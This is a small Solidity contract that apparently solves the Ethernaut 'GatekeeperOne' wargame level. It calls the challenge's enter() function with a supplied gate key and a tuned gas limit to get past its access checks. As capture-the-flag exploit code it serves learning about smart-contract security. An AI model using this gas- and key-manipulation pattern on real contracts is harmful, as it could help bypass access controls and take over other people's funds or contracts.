// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './GatekeeperOne.sol';

contract GatekeeperOneAttack {
    GatekeeperOne public challenge;

    constructor(address _challengeAddr) public {
        challenge = GatekeeperOne(_challengeAddr);
    }

    function attack(bytes8 _gateKey, uint256 gasToUse) public {
        challenge.enter{gas: gasToUse}(_gateKey);
    }
}